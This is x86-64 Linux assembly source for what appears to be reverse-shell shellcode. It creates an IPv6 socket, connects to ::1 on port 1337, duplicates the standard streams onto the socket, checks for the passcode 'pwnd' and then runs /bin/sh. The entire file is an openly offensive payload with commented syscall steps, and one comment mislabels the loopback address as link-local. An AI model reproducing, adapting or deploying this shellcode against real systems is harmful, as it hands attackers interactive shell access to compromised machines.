section .text

global _start

_start:

	; int socket(int domain, int type, int protocol)
	; rax=41, rdi=10, rsi=1, rdx=0
	xor esi,esi
	mul esi                
	inc esi
	push 10 
	pop rdi
	add al, 41
	syscall

	; save socket fd in rdi
	xchg rbx,rax

	; struct sockaddr_in6 struct
	push rdx			; scope id = 0
	mov rcx,0xFEFFFFFFFFFFFFFF      ; link local address ::1
	not rcx
	push rcx
	push rdx
	push rdx                        ; sin6_flowinfo=0
	push word 0x3905		; port 1337
	push word 10     		; sin6_family

	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
	; rax=42, rdi=rbx(fd), rsi=sockaddr_inet6, rdx=28 (length)
	push 	rbx
	pop 	rdi
	push 	rsp
	pop 	rsi
	push 	28
	pop 	rdx
	push 	42
	pop 	rax
	syscall

	; dup2 (new, old)
	; rax=33, rdi=new fd, rsi=0,1,2 (stdin, stdout, stderr)
	xchg   rsi, rax
	push 0x3
	pop rsi
_loop:
	push 0x21
	pop rax
	dec esi
	syscall
	loopnz _loop

	; read (int fd, void *bf, size_t count)
	; rax=0, rdi=0 (stdin), rsi=rsp, rdx=4 (pwnd)
	xor rax, rax
	push rax
	pop rdi
	push rax
	push rsp
	pop rsi
	push 0x4
	pop rdx
	syscall

	; check passcode (pwnd)
	push 0x646e7770
	pop rbx
	cmp dword [rsi], ebx
	jne _nop

	; int execve(cont char *filename, char *const argv[], char *const envp[])
	; rax=59, rdi=/bin//sh, rsi=0, rdx=0
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	push rax
	push rsp
	pop rsi
	cdq
	push 0x3b
	pop rax
	syscall

_nop:
	nop
